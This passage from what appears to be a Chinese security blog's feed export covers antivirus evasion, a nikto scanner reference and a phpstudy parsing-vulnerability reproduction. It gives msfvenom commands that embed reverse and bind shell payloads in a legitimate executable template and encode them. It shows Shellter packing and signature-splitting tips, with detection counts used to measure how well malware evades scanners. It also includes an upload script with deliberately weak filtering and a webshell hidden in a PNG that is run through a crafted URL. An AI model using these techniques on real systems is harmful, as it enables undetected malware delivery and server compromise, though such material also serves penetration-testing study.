<li>查看一下没有加密的 有49个有25个检查出了了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200331120732761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>查看一下加了密的 有49个有25个检查出了了，效果几乎一样<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200331120925592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<h2 id="利用模板隐藏-shell"><a href="#利用模板隐藏-shell" class="headerlink" title="利用模板隐藏 shell"></a>利用模板隐藏 shell</h2><p>利用无害的应用程序作为模板，叫恶意的代码附着上去</p>
<h3 id="利用模板隐藏-shell-1"><a href="#利用模板隐藏-shell-1" class="headerlink" title="利用模板隐藏 shell"></a>利用模板隐藏 shell</h3><pre><code><figure class="highlight"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o c.exe </span><br></pre></td></tr></table></figure></code></pre>
<p><strong>-x</strong> 指定一个模板/usr/share/windows-binaries/plink.exe就是kali自带的win系统的执行程序<br>其他参数上面说<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200331122103860.png" alt="在这里插入图片描述"></p>
<h3 id="模板隐藏-shell进行加密"><a href="#模板隐藏-shell进行加密" class="headerlink" title="模板隐藏 shell进行加密"></a>模板隐藏 shell进行加密</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; d.exe</span><br></pre></td></tr></table></figure>

<h3 id="查看一下用在线病毒查杀看一下加密和不加密的-1"><a href="#查看一下用在线病毒查杀看一下加密和不加密的-1" class="headerlink" title="查看一下用在线病毒查杀看一下加密和不加密的"></a>查看一下用在线病毒查杀看一下加密和不加密的</h3><ol>
<li>查看一下没有加密的 有49个有21个检查出了了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200331122613364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>查看一下加了密的 有49个有21个检查出了了，效果几乎一样<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200331122653322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<h1 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h1><p>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向软件</p>
<ol>
<li>Hyperion （32bit PE 程序加密器）工具<br> 他是专门针对32位的PE程序<br> 他有两个模块Crypter (加密器)和Container（解密器）<br> 下载地址在有很个个版本：<a href="https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/release">https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/release</a></li>
</ol>
]]></content>
      <categories>
        <category>免杀技术</category>
      </categories>
      <tags>
        <tag>免杀技术</tag>
      </tags>
  </entry>
  <entry>
    <title>4.木马病毒和免杀技术</title>
    <url>/2020/04/02/ms4/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><ul>
<li>传统的杀毒原理<ul>
<li>杀病毒的原理是根据里面的特征字符进行判断是否是病毒或者我木马，</li>
</ul>
</li>
<li>我们就可以使用笨办法进行免杀<ul>
<li>原理是：叫木马或者病毒程序进行分块，分块后，叫第一块生成文件叫杀毒软件进行查杀，如果没有查出第一块是病毒，在和第一块和第二块进行组合生成文件在进行查杀，以此类推，等到查杀到那块是病毒，查出来的那个在进行分很小的块，在进行查杀，以此类推找到特征字符</li>
</ul>
</li>
</ul>
<h1 id="程序分片"><a href="#程序分片" class="headerlink" title="程序分片"></a>程序分片</h1><p>应用分片工具Evade应为我这个工具没有找到，下面是照片是视频里的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200402183715374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="文件修改"><a href="#文件修改" class="headerlink" title="文件修改"></a>文件修改</h1><p>如果找到了被杀掉的软件就可以用16进制软件进行修改了<br>下载16进制软件</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">apt</span> <span class="selector-tag">install</span> <span class="selector-tag">ghex</span></span><br></pre></td></tr></table></figure>
<p>下载好后使用</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">ghex</span>  应用名</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200402185050909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="Shellter下载"><a href="#Shellter下载" class="headerlink" title="Shellter下载"></a>Shellter下载</h1><p>用Shellter工具官方<a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a><br>下载Shellter命令：<code>apt install shellter</code><br>通过多态的方式生成免杀的程序<br>他的工作的方式是要指定一个模板，正常的模板程序不是病毒，然后他将他的病毒代码进行各种混淆加密封装打散在加入到模板里，增高免杀</p>
<h1 id="Shellter使用"><a href="#Shellter使用" class="headerlink" title="Shellter使用"></a>Shellter使用</h1><div class="note info simple"><p>启动后就是这样的</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200402192337243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<div class="note info simple"><p>可以输入h进行查看参数</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200402192431541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<div class="note info simple"><p>A是自动话M是手动，这个我就选择A了，然后在指定一个正常程序模块</p>
</div>

<div class="note info simple"><p>指定完整路径</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200402195105372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<div class="note info simple"><p>运行完后上面的他就会让你选择病毒了</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200402200709136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<div class="note info simple"><p>上面是选择的是7如果选择1就要你添加IP和端口了<br>生成出了的文件看一下</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200402202408784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<div class="note info simple"><p>还是被火绒给查出了了</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200402202054374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<div class="note info simple"><p>看一下查杀网站，检查出来11个还是不错的</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200402203048624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>免杀技术</category>
      </categories>
      <tags>
        <tag>免杀技术</tag>
      </tags>
  </entry>
  <entry>
    <title>nikto web服务器扫描器工具</title>
    <url>/2021/08/07/nikto/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><a href="https://github.com/sullo/nikto/wiki">官方工具的使用</a></p>
<p><strong>之前学习的时候没有做好笔记导致现在忘完了，下面就叫我学习给记录下来</strong></p>
<p>Nikto 是一款开源 (GPL) 网络服务器扫描器，可针对多个项目对网络服务器执行全面测试，包括 6700 多个具有潜在危险的文件/程序、检查 1250 多个服务器的过时版本以及 270 多个服务器上的版本特定问题。它还会检查服务器配置项目，例如是否存在多个索引文件、HTTP 服务器选项，并将尝试识别已安装的 Web 服务器和软件。扫描项目和插件经常更新，可以自动更新</p>
<h1 id="nikto工具安装"><a href="#nikto工具安装" class="headerlink" title="nikto工具安装"></a>nikto工具安装</h1><div class="note warning simple"><p>kali默认是安装了的</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210807103712146.png" alt="image-20210807103712146"></p>
<p><strong>其他linux的安装方法很简单</strong></p>
<p>克隆github</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/sullo/nikto</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210807084226366.png" alt="image-20210807084226366"></p>
<p>proxychains4是我添加了代理</p>
<p>进入目录<code>cd nikto/program</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210807084433328.png" alt="image-20210807084433328"></p>
<p>运行<code>./nikto.pl   </code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210807084525664.png" alt="image-20210807084525664"></p>
<h1 id="nikto工具的使用"><a href="#nikto工具的使用" class="headerlink" title="nikto工具的使用"></a>nikto工具的使用</h1><h2 id="全部参数"><a href="#全部参数" class="headerlink" title="全部参数"></a>全部参数</h2><table>
<thead>
<tr>
<th>选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-ask</td>
<td>是否询问提交更新： yes - 询问每个（默认） *no - 不询问，不发送 *auto - 不询问，只发送</td>
</tr>
<tr>
<td>-Cgidirs</td>
<td>扫描这些 CGI 目录： * none * all * 或类似 “/cgi/ /cgi-a/“ 的值</td>
</tr>
<tr>
<td>-config</td>
<td>使用这个配置文件</td>
</tr>
<tr>
<td>-Display</td>
<td>打开/关闭显示输出：</td>
</tr>
<tr>
<td></td>
<td>1 显示重定向</td>
</tr>
<tr>
<td></td>
<td>2 显示收到的 cookie</td>
</tr>
<tr>
<td></td>
<td>3 显示所有 200/OK 响应</td>
</tr>
<tr>
<td></td>
<td>4 显示需要身份验证的 URL * D 调试输出 * E 显示所有 HTTP 错误 * P 打印进度到 STDOUT * S Scrub IP 和主机名的 输出 * V 详细输出</td>
</tr>
<tr>
<td>-dbcheck</td>
<td>检查数据库和其他关键文件的语法错误</td>
</tr>
<tr>
<td>-evasion</td>
<td>编码技术：用来逃避</td>
</tr>
<tr>
<td></td>
<td>1 随机 URI 编码（非 UTF8）</td>
</tr>
<tr>
<td></td>
<td>2 目录自引用（/./）</td>
</tr>
<tr>
<td></td>
<td>3 过早的 URL 结尾</td>
</tr>
<tr>
<td></td>
<td>4 前置长随机字符串</td>
</tr>
<tr>
<td></td>
<td>5 假参数</td>
</tr>
<tr>
<td></td>
<td>6 TAB 作为请求间隔</td>
</tr>
<tr>
<td></td>
<td>7 更改URL的大小写</td>
</tr>
<tr>
<td></td>
<td>8 使用Windows目录分隔符()</td>
</tr>
<tr>
<td></td>
<td>A 使用回车 (0x0d) 作为请求间隔</td>
</tr>
<tr>
<td></td>
<td>B 使用二进制值 0x0b 作为请求间隔</td>
</tr>
<tr>
<td>-Format/-o</td>
<td>保存文件 (-o) 格式：</td>
</tr>
<tr>
<td></td>
<td>csv 逗号分隔值</td>
</tr>
<tr>
<td></td>
<td>json JSON 格式</td>
</tr>
<tr>
<td></td>
<td>htm HTML 格式</td>
</tr>
<tr>
<td></td>
<td>nbe Nessus NBE 格式</td>
</tr>
<tr>
<td></td>
<td>sql 通用 SQL（有关架构，请参阅文档）</td>
</tr>
<tr>
<td></td>
<td>txt 纯文本</td>
</tr>
<tr>
<td></td>
<td>xml XML 格式</td>
</tr>
<tr>
<td></td>
<td>（如果未指定，格式将从传递给 -output 的文件扩展名中获取）</td>
</tr>
<tr>
<td>-Help</td>
<td>此帮助信息</td>
</tr>
<tr>
<td>-host</td>
<td>目标主机/URL</td>
</tr>
<tr>
<td>-404code</td>
<td>忽略这些 HTTP 代码作为否定响应（始终）。格式为“302,301”。</td>
</tr>
<tr>
<td>-404string</td>
<td>在响应正文内容中忽略此字符串作为否定响应（始终）。可以是正则表达式。</td>
</tr>
<tr>
<td>-id</td>
<td>要使用的主机身份验证，格式为 id:pass 或 id:pass:realm</td>
</tr>
<tr>
<td>-key</td>
<td>客户端证书密钥文件</td>
</tr>
<tr>
<td>-list-plugins</td>
<td>列出所有可用的插件</td>
</tr>
<tr>
<td>-maxtime</td>
<td>每台主机的最长测试时间（例如，1h、60m、3600s）</td>
</tr>
<tr>
<td>-mutate</td>
<td>猜测其他文件名：</td>
</tr>
<tr>
<td></td>
<td>1 使用所有根目录测试所有文件</td>
</tr>
<tr>
<td></td>
<td>2 猜测密码文件名</td>
</tr>
<tr>
<td></td>
<td>3 通过 Apache 枚举用户名（/~user 类型请求）</td>
</tr>
<tr>
<td></td>
<td>4 通过 cgiwrap 枚举用户名（/cgi-bin/cgiwrap/~user 类型请求）</td>
</tr>
<tr>
<td></td>
<td>5 尝试暴力破解子域名，假设主机名是父域</td>
</tr>
<tr>
<td></td>
<td>6 尝试从提供的字典文件中猜测目录名</td>
</tr>
<tr>
<td>-mutate-options</td>
<td>提供变异信息</td>
</tr>
<tr>
<td>-nointeractive</td>
<td>禁用交互功能</td>
</tr>
<tr>
<td>-nolookup</td>
<td>禁用 DNS 查找</td>
</tr>
<tr>
<td>-nossl</td>
<td>禁用 SSL</td>
</tr>
<tr>
<td>-no404</td>
<td>禁用 nikto 尝试猜测 404 页面</td>
</tr>
<tr>
<td>-Option</td>
<td>覆盖 nikto.conf 中的一个选项，可以多次发出</td>
</tr>
<tr>
<td>-output</td>
<td>将输出写入此文件（“.”代表自动名称）</td>
</tr>
<tr>
<td>-Pause</td>
<td>在测试之间暂停（秒、整数或浮点数）</td>
</tr>
<tr>
<td>-Plugins</td>
<td>要运行的插件列表（默认值：ALL）</td>
</tr>
<tr>
<td>-port</td>
<td>要使用的端口（默认 80）</td>
</tr>
<tr>
<td>-RSAcert</td>
<td>客户端证书文件</td>
</tr>
<tr>
<td>-root</td>
<td>为所有请求添加根值，格式为 /directory</td>
</tr>
<tr>
<td>-Save</td>
<td>保存对该目录的肯定响应（’.’ 表示自动命名）</td>
</tr>
<tr>
<td>-ssl</td>
<td>在端口上强制 ssl 模式</td>
</tr>
<tr>
<td>-Tuning/-T</td>
<td>扫描调谐：</td>
</tr>
<tr>
<td></td>
<td>1 个有趣的文件 / 在日志中看到</td>
</tr>
<tr>
<td></td>
<td>2 错误配置/默认文件</td>
</tr>
<tr>
<td></td>
<td>3 信息披露</td>
</tr>
<tr>
<td></td>
<td>4 注入（XSS/脚本/HTML）</td>
</tr>
<tr>
<td></td>
<td>5 远程文件检索 - 内部 Web Root</td>
</tr>
<tr>
<td></td>
<td>6 拒绝服务</td>
</tr>
<tr>
<td></td>
<td>7 远程文件检索 - 服务器范围</td>
</tr>
<tr>
<td></td>
<td>8 命令执行/远程Shell</td>
</tr>
<tr>
<td></td>
<td>9 SQL注入</td>
</tr>
<tr>
<td></td>
<td>0 文件上传</td>
</tr>
<tr>
<td></td>
<td>a身份验证绕过</td>
</tr>
<tr>
<td></td>
<td>b 软件标识</td>
</tr>
<tr>
<td></td>
<td>c 远程源包含</td>
</tr>
<tr>
<td></td>
<td>d 网络服务</td>
</tr>
<tr>
<td></td>
<td>e管理控制台</td>
</tr>
<tr>
<td></td>
<td>x 反向调整选项（即，包括除指定之外的所有选项）</td>
</tr>
<tr>
<td>-timeout</td>
<td>请求超时（默认 10 秒）</td>
</tr>
<tr>
<td>-Userdbs</td>
<td>仅加载用户数据库，而不加载标准数据库</td>
</tr>
<tr>
<td></td>
<td>all 禁用标准数据库并仅加载用户数据库</td>
</tr>
<tr>
<td></td>
<td>测试仅禁用 db_tests 并加载 udb_tests</td>
</tr>
<tr>
<td>-useragent</td>
<td>覆盖默认的用户代理</td>
</tr>
<tr>
<td>-until</td>
<td>运行到指定的时间或持续时间</td>
</tr>
<tr>
<td>-update</td>
<td>从 CIRT.net 更新数据库和插件</td>
</tr>
<tr>
<td>-url</td>
<td>目标主机/URL（-host 的别名）</td>
</tr>
<tr>
<td>-useproxy</td>
<td>使用 nikto.conf 中定义的代理，例如<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></td>
</tr>
<tr>
<td>-Version</td>
<td>打印插件和数据库版本</td>
</tr>
<tr>
<td>-vhost</td>
<td>一个IP拥有多个网站时使用</td>
</tr>
</tbody></table>
<h2 id="常用的参数"><a href="#常用的参数" class="headerlink" title="常用的参数"></a>常用的参数</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-config            使用这个配置文件</span><br><span class="line">-Display          打开/关闭显示输出</span><br><span class="line">-dbcheck            检查数据库和其他关键文件的语法错误</span><br><span class="line">-Format            保存文件（-o）格式</span><br><span class="line">-Help               帮助信息</span><br><span class="line">-host              目标主机/URL</span><br><span class="line">-id                 要使用的主机认证，格式为 id:pass 或 id:pass:realm</span><br><span class="line">-list-plugins       列出所有可用的插件</span><br><span class="line">-output            将输出写入此文件</span><br><span class="line">-nossl              禁用 SSL</span><br><span class="line">-no404              禁用 404 检查</span><br><span class="line">-Plugins           要运行的插件列表（默认：ALL）</span><br><span class="line">-port              要使用的端口（默认为 80）</span><br><span class="line">-root              为所有请求添加根值，格式为 /directory</span><br><span class="line">-ssl                在端口上强制 ssl 模式</span><br><span class="line">-Tuning            扫描调谐</span><br><span class="line">-timeout           请求超时（默认 10 秒）</span><br><span class="line">-update             从 CIRT.net 更新数据库和插件t</span><br><span class="line">-Version            打印插件和数据库版本</span><br><span class="line">-vhost         	  一个IP拥有多个网站时使用</span><br><span class="line">-useproxy  中定义的代理，例如http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><div class="note warning simple"><p>查所有可用的插件</p>
</div>



<p>我们进行大量的扫描都是用的插件进行判断的</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nikto  -list-plugins</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210807103952072.png" alt="image-20210807103952072"></p>
<div class="note warning simple"><p>基本扫描</p>
</div>

<p><code>-h</code>即是<code>-host</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nikto -h 192.168.1.1 <span class="comment">#单个ip目标指定</span></span><br><span class="line">nikto -h www.xxx.com <span class="comment">#单个目标指定</span></span><br><span class="line">nikto -h http://www.xxx.com/abc/ <span class="comment">#单个目标指定和指定目录</span></span><br><span class="line">nikto -h a.txt <span class="comment">#多个目标扫描</span></span><br></pre></td></tr></table></figure>
<div class="note warning simple"><p>设置代理用<code>-useproxy </code>参数</p>
</div>



<p>格式</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nikto  xxxxxxx -useproxy http://xxxx:xxxxx </span><br></pre></td></tr></table></figure>
<p>下面的演示的命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo nikto  -h www.baidu.com -useproxy http://127.0.0.1:8889</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210807113757684.png" alt="image-20210807113757684"></p>
<h2 id="其他的就不演示了你们看参数吧"><a href="#其他的就不演示了你们看参数吧" class="headerlink" title="其他的就不演示了你们看参数吧"></a>其他的就不演示了你们看参数吧</h2><h1 id="扫描中的操作"><a href="#扫描中的操作" class="headerlink" title="扫描中的操作"></a>扫描中的操作</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">空格		是查看当前扫描百分之多少了剩余时间等等等</span><br><span class="line">v			是查看扫描状态正在扫描什么东西在按v暂停</span><br><span class="line">d			是查看详细发的信息在按d暂停</span><br><span class="line">e			显示错误信息在按e暂停</span><br><span class="line">p			显示扫描进度在按p暂停</span><br><span class="line">r			显示重定向信息在按r暂停</span><br><span class="line">c			显示cookie在按c暂停</span><br><span class="line">a			身份认证过程显示出来在按a暂停</span><br><span class="line">q			退出</span><br><span class="line">N		扫描下一个目标就是在指定文件扫描的使用用的</span><br><span class="line">P			暂停扫描</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>nikto</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstudy解析漏洞复现</title>
    <url>/2020/09/28/phpstudy%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="解析漏洞介绍"><a href="#解析漏洞介绍" class="headerlink" title="解析漏洞介绍"></a>解析漏洞介绍</h2><p>简单来说比如一个png照片文件我们把他解析成php脚本来执行，就叫做解析漏洞</p>
<h2 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h2><p><a href="https://wwa.lanzous.com/iWSXtgzjuoj">phpstudy(8.1.0.7版本)</a><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200924203020.png"></p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><code>phpstudy:phpstudy : &lt;=8.1.0.7</code></p>
<h2 id="安全配置错误漏洞"><a href="#安全配置错误漏洞" class="headerlink" title="安全配置错误漏洞"></a>安全配置错误漏洞</h2><p>1、由于用户的错误配置导致 nginx 把以 .php 结尾的文件交给 fastcgi 处理,为此可以构造 <a href="http://www.xxx.com/test.gif/xx.php">http://www.xxx.com/test.gif/xx.php</a> (任何服务器端不存在的php文件均可,比如a.php)</p>
<p>2、但是 fastcgi 在处理 xx.php 文件时发现文件并不存在,这时 php.ini 配置文件中 cgi.fix_pathinfo=1 发挥作用,这项配置用于修复路径,如果当前路径不存在则采用上层路径。为此这里交由 fastcgi 处理的文件就变成了 /test.gif 。</p>
<p>3、 最重要的一点是 php-fpm.conf 中的 security.limit_extensions 配置项限制了 fastcgi 解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许 fastcgi 将 .png 等文件当做代码解析。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>安装phpstudy(8.1.0.7版本)<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200924203020.png"></p>
<p>自己写了一个文件上发的脚本<br>里面过滤不是照片的文件<br>a.php文件<br>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">	<span class="comment">//上发文件的位置</span></span><br><span class="line">    $a=<span class="string">&quot;C:\d\phpstudy_pro\WWW\\&quot;</span>.$_FILES[<span class="string">&quot;upload_file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;upload_file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],$a);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件在&quot;</span>.$a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> method=<span class="string">&quot;post&quot;</span> onsubmit=<span class="string">&quot;return checkFile()&quot;</span>&gt;</span><br><span class="line">    &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">    &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;</span><br><span class="line">    &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>当我们上传web木马的时候发现php被拦截了，<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200928103502.png"></p>
<h2 id="我们就可以利用这个解析漏洞"><a href="#我们就可以利用这个解析漏洞" class="headerlink" title="我们就可以利用这个解析漏洞"></a>我们就可以利用这个解析漏洞</h2><p>在一个照片后面添加一个web语句话木马<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200928104738.png"><br>发现能上传上去<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200928104914.png"><br>我们就可以利用解析漏洞去执行里面的php脚本</p>
<p>URL地址<code>http://192.168.31.113/webshell.png/xxx.php?cmd=ipconfig</code><br>URL介绍<br><code>webshell.png</code>这个是那个我们上发的文件<br>后面随便跟上<code>xxx.php</code>他就可以把<code>webshell.png</code>照片解析成php脚本<br>可以看见执行成功<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200928105934.png"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>picGo加gitee图床搭建和配置</title>
    <url>/2020/09/08/picGo%E5%8A%A0gitee%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
